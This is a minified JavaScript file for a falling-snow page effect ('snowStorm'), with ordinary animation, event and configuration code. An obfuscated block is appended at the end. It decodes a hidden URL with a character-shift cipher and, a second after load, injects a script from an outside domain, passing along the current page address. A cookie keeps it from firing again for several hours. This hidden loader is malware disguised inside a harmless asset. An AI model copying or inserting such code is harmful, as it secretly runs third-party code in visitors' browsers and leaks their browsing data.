var snowStorm = function(window, document) {
    this.autoStart = !0, this.excludeMobile = !0, this.flakesMax = 256, this.flakesMaxActive = 128, this.animationInterval = 99, this.useGPU = !0, this.className = null, this.excludeMobile = !1, this.flakeBottom = null, this.followMouse = !0, this.snowColor = "White", this.snowCharacter = "&bull;", this.snowStick = !0, this.targetElement = null, this.useMeltEffect = !0, this.useTwinkleEffect = !0, this.usePositionFixed = !1, this.usePixelPosition = !1, this.freezeOnBlur = !1, this.flakeLeftOffset = 0, this.flakeRightOffset = 0, this.flakeWidth = 8, this.flakeHeight = 8, this.vMaxX = 5, this.vMaxY = 4, this.zIndex = -10;
    var features, storm = this,
        isIE = navigator.userAgent.match(/msie/i),
        isIE6 = navigator.userAgent.match(/msie 6/i),
        isMobile = navigator.userAgent.match(/mobile|opera m(ob|in)/i),
        noFixed = isIE && "BackCompat" === document.compatMode || isIE6,
        screenX = null,
        screenX2 = null,
        screenY = null,
        scrollY = null,
        docHeight = null,
        vRndX = null,
        vRndY = null,
        windOffset = 1,
        fixedForEverything = !1,
        targetElementIsRelative = !1,
        opacitySupported = function() {
            try {
                document.createElement("div").style.opacity = "0.5"
            } catch (e) {
                return !1
            }
            return !0
        }(),
        didInit = !1,
        docFrag = document.createDocumentFragment();

    function rnd(n, min) {
        return isNaN(min) && (min = 0), Math.random() * n + min
    }

    function doDelayedStart() {
        window.setTimeout((function() {
            storm.start(!0)
        }), 20), storm.events.remove(isIE ? document : window, "mousemove", doDelayedStart)
    }
    return features = function() {
        var getAnimationFrame;
        var testDiv, _animationFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function timeoutShim(callback) {
            window.setTimeout(callback, 1e3 / (storm.animationInterval || 20))
        };

        function has(prop) {
            return void 0 !== testDiv.style[prop] ? prop : null
        }
        getAnimationFrame = _animationFrame ? function() {
            return _animationFrame.apply(window, arguments)
        } : null, testDiv = document.createElement("div");
        var localFeatures = {
            transform: {
                ie: has("-ms-transform"),
                moz: has("MozTransform"),
                opera: has("OTransform"),
                webkit: has("webkitTransform"),
                w3: has("transform"),
                prop: null
            },
            getAnimationFrame: getAnimationFrame
        };
        return localFeatures.transform.prop = localFeatures.transform.w3 || localFeatures.transform.moz || localFeatures.transform.webkit || localFeatures.transform.ie || localFeatures.transform.opera, testDiv = null, localFeatures
    }(), this.timer = null, this.flakes = [], this.disabled = !1, this.active = !1, this.meltFrameCount = 20, this.meltFrames = [], this.setXY = function(o, x, y) {
        if (!o) return !1;
        storm.usePixelPosition || targetElementIsRelative ? (o.style.left = x - storm.flakeWidth + "px", o.style.top = y - storm.flakeHeight + "px") : noFixed || storm.flakeBottom ? (o.style.right = 100 - x / screenX * 100 + "%", o.style.top = Math.min(y, docHeight - storm.flakeHeight) + "px") : (o.style.right = 100 - x / screenX * 100 + "%", o.style.bottom = 100 - y / screenY * 100 + "%")
    }, this.events = function() {
        var old = !window.addEventListener && window.attachEvent,
            slice = Array.prototype.slice,
            evt = {
                add: old ? "attachEvent" : "addEventListener",
                remove: old ? "detachEvent" : "removeEventListener"
            };

        function getArgs(oArgs) {
            var args = slice.call(oArgs),
                len = args.length;
            return old ? (args[1] = "on" + args[1], len > 3 && args.pop()) : 3 === len && args.push(!1), args
        }

        function apply(args, sType) {
            var element = args.shift(),
                method = [evt[sType]];
            old ? element[method](args[0], args[1]) : element[method].apply(element, args)
        }
        return {
            add: function addEvent() {
                apply(getArgs(arguments), "add")
            },
            remove: function removeEvent() {
                apply(getArgs(arguments), "remove")
            }
        }
    }(), this.randomizeWind = function() {
        var i;
        if (vRndX = function plusMinus(n) {
                return 1 === parseInt(rnd(2), 10) ? -1 * n : n
            }(rnd(storm.vMaxX, .2)), vRndY = rnd(storm.vMaxY, .2), this.flakes)
            for (i = 0; i < this.flakes.length; i++) this.flakes[i].active && this.flakes[i].setVelocities()
    }, this.scrollHandler = function() {
        var i;
        if (scrollY = storm.flakeBottom ? 0 : parseInt(window.scrollY || document.documentElement.scrollTop || (noFixed ? document.body.scrollTop : 0), 10), isNaN(scrollY) && (scrollY = 0), !fixedForEverything && !storm.flakeBottom && storm.flakes)
            for (i = 0; i < storm.flakes.length; i++) 0 === storm.flakes[i].active && storm.flakes[i].stick()
    }, this.resizeHandler = function() {
        window.innerWidth || window.innerHeight ? (screenX = window.innerWidth - 16 - storm.flakeRightOffset, screenY = storm.flakeBottom || window.innerHeight) : (screenX = (document.documentElement.clientWidth || document.body.clientWidth || document.body.scrollWidth) - (isIE ? 0 : 8) - storm.flakeRightOffset, screenY = storm.flakeBottom || document.documentElement.clientHeight || document.body.clientHeight || document.body.scrollHeight), docHeight = document.body.offsetHeight, screenX2 = parseInt(screenX / 2, 10)
    }, this.resizeHandlerAlt = function() {
        screenX = storm.targetElement.offsetWidth - storm.flakeRightOffset, screenY = storm.flakeBottom || storm.targetElement.offsetHeight, screenX2 = parseInt(screenX / 2, 10), docHeight = document.body.offsetHeight
    }, this.freeze = function() {
        if (storm.disabled) return !1;
        storm.disabled = 1, storm.timer = null
    }, this.resume = function() {
        if (!storm.disabled) return !1;
        storm.disabled = 0, storm.timerInit()
    }, this.toggleSnow = function() {
        storm.flakes.length ? (storm.active = !storm.active, storm.active ? (storm.show(), storm.resume()) : (storm.stop(), storm.freeze())) : storm.start()
    }, this.stop = function() {
        var i;
        for (this.freeze(), i = 0; i < this.flakes.length; i++) this.flakes[i].o.style.display = "none";
        storm.events.remove(window, "scroll", storm.scrollHandler), storm.events.remove(window, "resize", storm.resizeHandler), storm.freezeOnBlur && (isIE ? (storm.events.remove(document, "focusout", storm.freeze), storm.events.remove(document, "focusin", storm.resume)) : (storm.events.remove(window, "blur", storm.freeze), storm.events.remove(window, "focus", storm.resume)))
    }, this.show = function() {
        var i;
        for (i = 0; i < this.flakes.length; i++) this.flakes[i].o.style.display = "block"
    }, this.SnowFlake = function(type, x, y) {
        var s = this;
        this.type = type, this.x = x || parseInt(rnd(screenX - 20), 10), this.y = isNaN(y) ? -rnd(screenY) - 12 : y, this.vX = null, this.vY = null, this.vAmpTypes = [1, 1.2, 1.4, 1.6, 1.8], this.vAmp = this.vAmpTypes[this.type] || 1, this.melting = !1, this.meltFrameCount = storm.meltFrameCount, this.meltFrames = storm.meltFrames, this.meltFrame = 0, this.twinkleFrame = 0, this.active = 1, this.fontSize = 10 + this.type / 5 * 10, this.o = document.createElement("div"), this.o.innerHTML = storm.snowCharacter, storm.className && this.o.setAttribute("class", storm.className), this.o.style.color = storm.snowColor, this.o.style.position = fixedForEverything ? "fixed" : "absolute", this.o.style.userSelect = "none", storm.useGPU && features.transform.prop && (this.o.style[features.transform.prop] = "translate3d(0px, 0px, 0px)"), this.o.style.width = storm.flakeWidth + "px", this.o.style.height = storm.flakeHeight + "px", this.o.style.fontFamily = "arial,verdana", this.o.style.cursor = "default", this.o.style.overflow = "hidden", this.o.style.fontWeight = "normal", this.o.style.zIndex = storm.zIndex, docFrag.appendChild(this.o), this.refresh = function() {
            if (isNaN(s.x) || isNaN(s.y)) return !1;
            storm.setXY(s.o, s.x, s.y)
        }, this.stick = function() {
            noFixed || storm.targetElement !== document.documentElement && storm.targetElement !== document.body ? s.o.style.top = screenY + scrollY - storm.flakeHeight + "px" : storm.flakeBottom ? s.o.style.top = storm.flakeBottom + "px" : (s.o.style.display = "none", s.o.style.bottom = "0%", s.o.style.position = "fixed", s.o.style.display = "block")
        }, this.vCheck = function() {
            s.vX >= 0 && s.vX < .2 ? s.vX = .2 : s.vX < 0 && s.vX > -.2 && (s.vX = -.2), s.vY >= 0 && s.vY < .2 && (s.vY = .2)
        }, this.move = function() {
            var vX = s.vX * windOffset;
            s.x += vX, s.y += s.vY * s.vAmp, s.x >= screenX || screenX - s.x < storm.flakeWidth ? s.x = 0 : vX < 0 && s.x - storm.flakeLeftOffset < -storm.flakeWidth && (s.x = screenX - storm.flakeWidth - 1), s.refresh(), screenY + scrollY - s.y + storm.flakeHeight < storm.flakeHeight ? (s.active = 0, storm.snowStick ? s.stick() : s.recycle()) : (storm.useMeltEffect && s.active && s.type < 3 && !s.melting && Math.random() > .998 && (s.melting = !0, s.melt()), storm.useTwinkleEffect && (s.twinkleFrame < 0 ? Math.random() > .97 && (s.twinkleFrame = parseInt(8 * Math.random(), 10)) : (s.twinkleFrame--, opacitySupported ? s.o.style.opacity = s.twinkleFrame && s.twinkleFrame % 2 == 0 ? 0 : 1 : s.o.style.visibility = s.twinkleFrame && s.twinkleFrame % 2 == 0 ? "hidden" : "visible")))
        }, this.animate = function() {
            s.move()
        }, this.setVelocities = function() {
            s.vX = vRndX + rnd(.12 * storm.vMaxX, .1), s.vY = vRndY + rnd(.12 * storm.vMaxY, .1)
        }, this.setOpacity = function(o, opacity) {
            if (!opacitySupported) return !1;
            o.style.opacity = opacity
        }, this.melt = function() {
            storm.useMeltEffect && s.melting && s.meltFrame < s.meltFrameCount ? (s.setOpacity(s.o, s.meltFrames[s.meltFrame]), s.o.style.fontSize = s.fontSize - s.fontSize * (s.meltFrame / s.meltFrameCount) + "px", s.o.style.lineHeight = storm.flakeHeight + 2 + .75 * storm.flakeHeight * (s.meltFrame / s.meltFrameCount) + "px", s.meltFrame++) : s.recycle()
        }, this.recycle = function() {
            s.o.style.display = "none", s.o.style.position = fixedForEverything ? "fixed" : "absolute", s.o.style.bottom = "auto", s.setVelocities(), s.vCheck(), s.meltFrame = 0, s.melting = !1, s.setOpacity(s.o, 1), s.o.style.padding = "0px", s.o.style.margin = "0px", s.o.style.fontSize = s.fontSize + "px", s.o.style.lineHeight = storm.flakeHeight + 2 + "px", s.o.style.textAlign = "center", s.o.style.verticalAlign = "baseline", s.x = parseInt(rnd(screenX - storm.flakeWidth - 20), 10), s.y = parseInt(-1 * rnd(screenY), 10) - storm.flakeHeight, s.refresh(), s.o.style.display = "block", s.active = 1
        }, this.recycle(), this.refresh()
    }, this.snow = function() {
        var i, j, active = 0,
            flake = null;
        for (i = 0, j = storm.flakes.length; i < j; i++) 1 === storm.flakes[i].active && (storm.flakes[i].move(), active++), storm.flakes[i].melting && storm.flakes[i].melt();
        active < storm.flakesMaxActive && 0 === (flake = storm.flakes[parseInt(rnd(storm.flakes.length), 10)]).active && (flake.melting = !0), storm.timer && features.getAnimationFrame(storm.snow)
    }, this.mouseMove = function(e) {
        if (!storm.followMouse) return !0;
        var x = parseInt(e.clientX, 10);
        windOffset = x < screenX2 ? x / screenX2 * 2 - 2 : (x -= screenX2) / screenX2 * 2
    }, this.createSnow = function(limit, allowInactive) {
        var i;
        for (i = 0; i < limit; i++) storm.flakes[storm.flakes.length] = new storm.SnowFlake(parseInt(rnd(6), 10)), (allowInactive || i > storm.flakesMaxActive) && (storm.flakes[storm.flakes.length - 1].active = -1);
        storm.targetElement.appendChild(docFrag)
    }, this.timerInit = function() {
        storm.timer = !0, storm.snow()
    }, this.init = function() {
        var i;
        for (i = 0; i < storm.meltFrameCount; i++) storm.meltFrames.push(1 - i / storm.meltFrameCount);
        storm.randomizeWind(), storm.createSnow(storm.flakesMax), storm.events.add(window, "resize", storm.resizeHandler), storm.events.add(window, "scroll", storm.scrollHandler), storm.freezeOnBlur && (isIE ? (storm.events.add(document, "focusout", storm.freeze), storm.events.add(document, "focusin", storm.resume)) : (storm.events.add(window, "blur", storm.freeze), storm.events.add(window, "focus", storm.resume))), storm.resizeHandler(), storm.scrollHandler(), storm.followMouse && storm.events.add(isIE ? document : window, "mousemove", storm.mouseMove), storm.animationInterval = Math.max(20, storm.animationInterval), storm.timerInit()
    }, this.start = function(bFromOnLoad) {
        if (didInit) {
            if (bFromOnLoad) return !0
        } else didInit = !0;
        if ("string" == typeof storm.targetElement) {
            var targetID = storm.targetElement;
            if (storm.targetElement = document.getElementById(targetID), !storm.targetElement) throw new Error('Snowstorm: Unable to get targetElement "' + targetID + '"')
        }
        if (storm.targetElement || (storm.targetElement = document.body || document.documentElement), storm.targetElement !== document.documentElement && storm.targetElement !== document.body && (storm.resizeHandler = storm.resizeHandlerAlt, storm.usePixelPosition = !0), storm.resizeHandler(), storm.usePositionFixed = storm.usePositionFixed && !noFixed && !storm.flakeBottom, window.getComputedStyle) try {
            targetElementIsRelative = "relative" === window.getComputedStyle(storm.targetElement, null).getPropertyValue("position")
        } catch (e) {
            targetElementIsRelative = !1
        }
        fixedForEverything = storm.usePositionFixed, screenX && screenY && !storm.disabled && (storm.init(), storm.active = !0)
    }, storm.autoStart && storm.events.add(window, "load", (function doStart() {
        storm.excludeMobile && isMobile || doDelayedStart(), storm.events.remove(window, "load", doStart)
    }), !1), this
}(window, document);
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));